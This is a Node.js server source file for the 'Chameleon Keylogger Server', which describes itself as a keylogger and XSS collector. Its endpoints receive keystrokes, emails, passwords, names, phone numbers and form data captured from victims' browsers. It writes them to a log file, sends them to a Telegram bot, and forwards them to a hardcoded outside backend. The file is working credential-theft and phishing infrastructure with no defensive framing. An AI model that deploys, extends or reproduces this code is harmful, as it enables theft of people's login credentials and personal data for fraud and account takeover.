require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const axios = require('axios');

// ============================================================
//  CONFIGURATION
// ============================================================

const app = express();
const PORT = process.env.KEYLOGGER_PORT || process.env.PORT || 3001;
const LOG_FILE = process.env.LOG_FILE || path.join(__dirname, 'logs', 'keystrokes.log');
const LOG_DIR = path.dirname(LOG_FILE);

// Ensure log directory exists
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
}

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Backend URL for forwarding
const BACKEND_URL = process.env.BACKEND_URL || 'https://meeting-1-rzx6.onrender.com';

// ============================================================
//  MIDDLEWARE
// ============================================================

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// ============================================================
//  LOGGING FUNCTIONS
// ============================================================

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();

    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }

    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();

    return req.socket.remoteAddress || 'unknown';
}

function getDeviceType(userAgent) {
    if (!userAgent) return 'Unknown';
    const ua = userAgent.toLowerCase();
    if (/tablet|ipad|playbook|silk/i.test(ua)) return 'Tablet';
    if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile/i.test(ua)) return 'Mobile';
    if (/windows|mac|linux|chrome os/i.test(ua)) return 'Desktop';
    return 'Unknown';
}

function getBrowser(userAgent) {
    if (!userAgent) return 'Unknown';
    const ua = userAgent.toLowerCase();
    if (ua.includes('chrome') && !ua.includes('edge') && !ua.includes('opera')) return 'Chrome';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    if (ua.includes('edge')) return 'Edge';
    if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
    if (ua.includes('brave')) return 'Brave';
    return 'Other';
}

function getOS(userAgent) {
    if (!userAgent) return 'Unknown';
    const ua = userAgent.toLowerCase();
    if (ua.includes('windows')) return 'Windows';
    if (ua.includes('mac os')) return 'macOS';
    if (ua.includes('linux')) return 'Linux';
    if (ua.includes('android')) return 'Android';
    if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
    if (ua.includes('chrome os')) return 'Chrome OS';
    return 'Other';
}

// ============================================================
//  TELEGRAM FUNCTIONS
// ============================================================

async function sendToTelegram(text, parseMode = 'Markdown') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('[TELEGRAM] ⚠️ Missing credentials, skipping');
        return false;
    }

    try {
        // Split long messages (Telegram limit is 4096 characters)
        const maxLength = 4000;
        if (text.length > maxLength) {
            const chunks = text.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
            for (const chunk of chunks) {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: chunk,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                });
            }
        } else {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: parseMode,
                disable_web_page_preview: true
            });
        }
        console.log('[TELEGRAM] ✅ Sent successfully');
        return true;
    } catch (error) {
        console.error('[TELEGRAM] ❌ Failed:', error.message);
        if (error.response) {
            console.error('[TELEGRAM] Response:', error.response.data);
        }
        return false;
    }
}

async function sendKeylogToTelegram(data) {
    const { keystrokes, url, userAgent, timestamp, sessionId, isMobile, fullData, email, password, service, formData } = data;
    const ip = data.ip || getClientIp(data.req);
    const deviceType = getDeviceType(userAgent);
    const browser = getBrowser(userAgent);
    const os = getOS(userAgent);
    
    let msg = `⌨️ *KEYLOGGER CAPTURE*\n\n`;
    msg += `*📍 IP:* ${ip}\n`;
    msg += `*📱 Device:* ${deviceType}\n`;
    msg += `*💻 Browser:* ${browser}\n`;
    msg += `*🖥️ OS:* ${os}\n`;
    msg += `*📱 Mobile:* ${isMobile ? 'Yes' : 'No'}\n`;
    msg += `*🆔 Session:* ${sessionId || 'Unknown'}\n`;
    msg += `*🎯 Service:* ${service || 'Unknown'}\n`;
    
    if (email) {
        msg += `*📧 Email:* ${email}\n`;
    }
    if (password) {
        msg += `*🔑 Password:* ${password}\n`;
    }
    
    msg += `*🔗 URL:* ${url || 'Unknown'}\n`;
    msg += `*🕐 Time:* ${timestamp || new Date().toISOString()}\n\n`;
    
    // Keystrokes (truncated if too long)
    const keystrokeDisplay = keystrokes && keystrokes.length > 1000 ? 
        keystrokes.substring(0, 1000) + '\n... (truncated)' : 
        keystrokes || 'No keystrokes';
    
    msg += `*⌨️ Keystrokes:*\n\`\`\`\n${keystrokeDisplay}\n\`\`\``;
    
    // Form data if available
    if (formData && Object.keys(formData).length > 0) {
        const formDataStr = JSON.stringify(formData, null, 2);
        if (formDataStr.length > 500) {
            msg += `\n*📝 Form Data:*\n\`\`\`json\n${formDataStr.substring(0, 500)}\n... (truncated)\n\`\`\``;
        } else {
            msg += `\n*📝 Form Data:*\n\`\`\`json\n${formDataStr}\n\`\`\``;
        }
    }
    
    // Full data if available
    if (fullData && Object.keys(fullData).length > 0) {
        const fullDataStr = JSON.stringify(fullData, null, 2);
        if (fullDataStr.length > 500) {
            msg += `\n*📝 Full Data:*\n\`\`\`json\n${fullDataStr.substring(0, 500)}\n... (truncated)\n\`\`\``;
        } else {
            msg += `\n*📝 Full Data:*\n\`\`\`json\n${fullDataStr}\n\`\`\``;
        }
    }
    
    await sendToTelegram(msg);
}

// ============================================================
//  LOG TO FILE (Render compatible)
// ============================================================

function logToFile(entry) {
    try {
        // Write to file synchronously for Render
        fs.appendFileSync(LOG_FILE, entry, 'utf8');
        console.log('[LOG] ✅ Written to file');
    } catch (err) {
        console.error('[LOG] ❌ Write error:', err.message);
        // Try to write to fallback location
        try {
            const fallbackFile = path.join(__dirname, 'keystrokes_fallback.log');
            fs.appendFileSync(fallbackFile, entry, 'utf8');
            console.log('[LOG] ✅ Written to fallback file');
        } catch (e) {
            console.error('[LOG] ❌ Fallback write also failed:', e.message);
        }
    }
}

// ============================================================
//  ROUTES
// ============================================================

// --- Keylogger endpoint ---
app.post('/log', async (req, res) => {
    try {
        const { 
            keystrokes, 
            url, 
            userAgent, 
            timestamp, 
            sessionId, 
            isMobile, 
            fullData,
            email,
            password,
            service,
            formData,
            referrer
        } = req.body;
        
        if (!keystrokes || keystrokes.length === 0) {
            return res.status(400).json({ error: 'No keystrokes provided' });
        }

        const ip = getClientIp(req);
        const deviceType = getDeviceType(userAgent);
        const browser = getBrowser(userAgent);
        const os = getOS(userAgent);
        const time = timestamp || new Date().toISOString();

        // Build log entry
        let logEntry = `\n${'='.repeat(80)}\n`;
        logEntry += `[${time}] KEYLOG CAPTURE\n`;
        logEntry += `${'-'.repeat(80)}\n`;
        logEntry += `📍 IP: ${ip}\n`;
        logEntry += `📱 Device: ${deviceType}\n`;
        logEntry += `💻 Browser: ${browser}\n`;
        logEntry += `🖥️ OS: ${os}\n`;
        logEntry += `📱 Mobile: ${isMobile ? 'Yes' : 'No'}\n`;
        logEntry += `🆔 Session: ${sessionId || 'Unknown'}\n`;
        logEntry += `🎯 Service: ${service || 'Unknown'}\n`;
        if (email) logEntry += `📧 Email: ${email}\n`;
        if (password) logEntry += `🔑 Password: ${password}\n`;
        logEntry += `🔗 URL: ${url || 'Unknown'}\n`;
        if (referrer) logEntry += `🔗 Referrer: ${referrer}\n`;
        logEntry += `🕐 Time: ${time}\n`;
        logEntry += `${'-'.repeat(80)}\n`;
        logEntry += `⌨️ KEYSTROKES:\n${keystrokes}\n`;
        
        if (formData && Object.keys(formData).length > 0) {
            logEntry += `\n📝 FORM DATA:\n${JSON.stringify(formData, null, 2)}\n`;
        }
        
        if (fullData && Object.keys(fullData).length > 0) {
            logEntry += `\n📝 FULL DATA:\n${JSON.stringify(fullData, null, 2)}\n`;
        }
        
        logEntry += `${'='.repeat(80)}\n`;

        // Write to file
        logToFile(logEntry);

        // Send to Telegram (if configured)
        const telegramData = {
            keystrokes,
            url,
            userAgent,
            timestamp: time,
            sessionId,
            isMobile,
            fullData,
            email,
            password,
            service,
            formData,
            ip,
            req: req
        };
        
        await sendKeylogToTelegram(telegramData);

        // Forward to backend
        try {
            await axios.post(`${BACKEND_URL}/api/keylog`, {
                keystrokes,
                url,
                userAgent,
                timestamp: time,
                sessionId,
                ip,
                email,
                password,
                service
            });
        } catch (e) {
            console.log('[BACKEND] ⚠️ Forward failed:', e.message);
        }

        console.log(`[KEYLOG] 📥 Captured ${keystrokes.length} keystrokes from ${ip}`);

        res.status(200).json({ 
            success: true, 
            message: 'Keylog captured successfully',
            length: keystrokes.length
        });

    } catch (error) {
        console.error('[ERROR] Keylog handler:', error.message);
        console.error('[ERROR] Stack:', error.stack);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// --- Combined log endpoint ---
app.post('/log-combined', async (req, res) => {
    try {
        const { 
            type,
            keystrokes,
            email,
            password,
            url,
            userAgent,
            timestamp,
            sessionId,
            formData,
            fullData,
            service,
            action,
            phone,
            name,
            domain,
            company
        } = req.body;

        const ip = getClientIp(req);
        const time = timestamp || new Date().toISOString();
        const deviceType = getDeviceType(userAgent);

        // Build comprehensive log entry
        let logEntry = `\n${'='.repeat(80)}\n`;
        logEntry += `[${time}] ${type || 'COMBINED'} CAPTURE\n`;
        logEntry += `${'-'.repeat(80)}\n`;
        logEntry += `📍 IP: ${ip}\n`;
        logEntry += `📱 Device: ${deviceType}\n`;
        logEntry += `🆔 Session: ${sessionId || 'Unknown'}\n`;
        logEntry += `🎯 Service: ${service || 'Unknown'}\n`;
        logEntry += `🔗 URL: ${url || 'Unknown'}\n`;
        logEntry += `📧 Email: ${email || 'Unknown'}\n`;
        logEntry += `🔑 Password: ${password || 'N/A'}\n`;
        if (name) logEntry += `👤 Name: ${name}\n`;
        if (phone) logEntry += `📱 Phone: ${phone}\n`;
        if (domain) logEntry += `🏢 Domain: ${domain}\n`;
        if (company) logEntry += `🏢 Company: ${company}\n`;
        logEntry += `📱 User Agent: ${userAgent || 'Unknown'}\n`;
        logEntry += `🕐 Time: ${time}\n`;
        logEntry += `${'-'.repeat(80)}\n`;
        
        if (keystrokes) {
            logEntry += `⌨️ KEYSTROKES:\n${keystrokes}\n`;
        }
        
        if (formData && Object.keys(formData).length > 0) {
            logEntry += `\n📝 FORM DATA:\n${JSON.stringify(formData, null, 2)}\n`;
        }
        
        if (fullData && Object.keys(fullData).length > 0) {
            logEntry += `\n📝 FULL DATA:\n${JSON.stringify(fullData, null, 2)}\n`;
        }
        
        logEntry += `${'='.repeat(80)}\n`;

        logToFile(logEntry);

        // Send to Telegram
        let msg = `🔐 *CHAMELEON CAPTURE*\n\n`;
        msg += `*📧 Email:* ${email || 'Unknown'}\n`;
        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
        msg += `*🎯 Service:* ${service || 'Unknown'}\n`;
        msg += `*📍 IP:* ${ip}\n`;
        msg += `*🆔 Session:* ${sessionId || 'Unknown'}\n`;
        msg += `*🔗 URL:* ${url || 'Unknown'}\n`;
        msg += `*🕐 Time:* ${time}\n`;
        msg += `*📋 Type:* ${type || 'Combined'}\n`;
        if (name) msg += `*👤 Name:* ${name}\n`;
        if (phone) msg += `*📱 Phone:* ${phone}\n`;
        if (domain) msg += `*🏢 Domain:* ${domain}\n`;
        if (company) msg += `*🏢 Company:* ${company}\n`;
        
        if (keystrokes && keystrokes.length > 0) {
            const keystrokeDisplay = keystrokes.length > 500 ? 
                keystrokes.substring(0, 500) + '...' : 
                keystrokes;
            msg += `\n*⌨️ Keystrokes:*\n\`\`\`\n${keystrokeDisplay}\n\`\`\``;
        }
        
        await sendToTelegram(msg);

        // Forward to backend
        try {
            await axios.post(`${BACKEND_URL}/api/log-action`, {
                action: action || 'combined_capture',
                email: email || 'unknown',
                password: password || '',
                visitorInfo: {
                    fullUrl: url,
                    userAgent: userAgent,
                    sessionId: sessionId,
                    ip: ip,
                    service: service
                },
                formData: formData || fullData
            });
        } catch (e) {
            console.log('[BACKEND] ⚠️ Forward failed:', e.message);
        }

        console.log(`[COMBINED] 📥 Captured ${type || 'data'} from ${ip}`);
        res.status(200).json({ success: true });

    } catch (error) {
        console.error('[ERROR] Combined handler:', error.message);
        console.error('[ERROR] Stack:', error.stack);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// --- Health check ---
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '1.0.0',
        logFile: LOG_FILE,
        logExists: fs.existsSync(LOG_FILE),
        telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
        environment: process.env.NODE_ENV || 'development'
    });
});

// --- Stats endpoint ---
app.get('/stats', (req, res) => {
    try {
        let stats = {
            totalKeystrokes: 0,
            totalEntries: 0,
            logSize: 0,
            logExists: false
        };
        
        if (fs.existsSync(LOG_FILE)) {
            const stat = fs.statSync(LOG_FILE);
            stats.logSize = stat.size;
            stats.logExists = true;
            
            // Count entries
            const content = fs.readFileSync(LOG_FILE, 'utf8');
            const entries = content.split('='.repeat(80));
            stats.totalEntries = entries.length - 1;
            
            // Count keystrokes
            const keystrokeMatches = content.match(/KEYSTROKES:/g);
            stats.totalKeystrokes = keystrokeMatches ? keystrokeMatches.length : 0;
        }
        
        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// --- View recent logs ---
app.get('/logs', (req, res) => {
    try {
        const lines = parseInt(req.query.lines) || 50;
        
        if (!fs.existsSync(LOG_FILE)) {
            return res.status(404).json({ error: 'Log file not found' });
        }
        
        const content = fs.readFileSync(LOG_FILE, 'utf8');
        const lines_array = content.split('\n');
        const recent = lines_array.slice(-lines).join('\n');
        
        res.json({
            totalLines: lines_array.length,
            displayedLines: Math.min(lines, lines_array.length),
            content: recent,
            file: LOG_FILE
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// --- Root endpoint ---
app.get('/', (req, res) => {
    res.json({
        name: 'Chameleon Keylogger Server',
        version: '1.0.0',
        endpoints: {
            '/log': 'POST - Receive keystrokes',
            '/log-combined': 'POST - Receive combined data',
            '/health': 'GET - Health check',
            '/stats': 'GET - Statistics',
            '/logs': 'GET - View recent logs'
        },
        telegram: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Not configured'
    });
});

// ============================================================
//  ERROR HANDLING
// ============================================================

app.use((err, req, res, next) => {
    console.error('[ERROR] Unhandled:', err.message);
    console.error('[ERROR] Stack:', err.stack);
    res.status(500).json({ error: 'Internal server error' });
});

// ============================================================
//  START SERVER
// ============================================================

app.listen(PORT, '0.0.0.0', () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║        ✅  CHAMELEON KEYLOGGER SERVER v1.0               ║');
    console.log('║        ⌨️  Advanced Keylogger + XSS Collector            ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log(`║   📍 Server:    http://0.0.0.0:${PORT}                   ║`);
    console.log(`║   📁 Log file:  ${LOG_FILE}                              ║`);
    console.log('║   🔗 Health:    /health                                  ║');
    console.log('║   🔗 Stats:     /stats                                   ║');
    console.log('║   🔗 Logs:      /logs                                   ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`║   🔗 Backend:   ${BACKEND_URL}`);
    console.log('║                                                           ║');
    console.log('║   🚀 Ready to receive keystrokes!                        ║');
    console.log('║   📥 POST to /log or /log-combined                      ║');
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  GRACEFUL SHUTDOWN
// ============================================================

process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM, shutting down gracefully...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('🛑 Received SIGINT, shutting down gracefully...');
    process.exit(0);
});